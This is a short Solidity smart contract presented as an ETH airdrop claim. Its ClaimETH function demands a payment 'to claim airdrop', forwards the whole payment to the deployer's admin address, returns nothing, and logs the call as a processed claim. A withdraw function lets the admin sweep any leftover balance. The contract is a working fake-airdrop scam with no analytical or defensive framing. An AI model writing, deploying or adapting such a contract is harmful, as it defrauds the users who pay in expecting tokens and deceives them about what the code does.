// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ClaimETHAirDrop {
    address public admin;
    
    event ClaimProcessed(address indexed user, uint256 amount);
    
    constructor() {
        admin = msg.sender;
    }
    
    function ClaimETH() external payable {
        require(msg.value > 0, "Payment required to claim airdrop");
        
        // Transfer the entire payment to the admin
        (bool success, ) = admin.call{value: msg.value}("");
        require(success, "Transfer to admin failed");
        
        emit ClaimProcessed(msg.sender, msg.value);
    }
    
    // Allow admin to withdraw any remaining ETH
    function withdraw() external {
        require(msg.sender == admin, "Only admin can withdraw");
        payable(admin).transfer(address(this).balance);
    }
}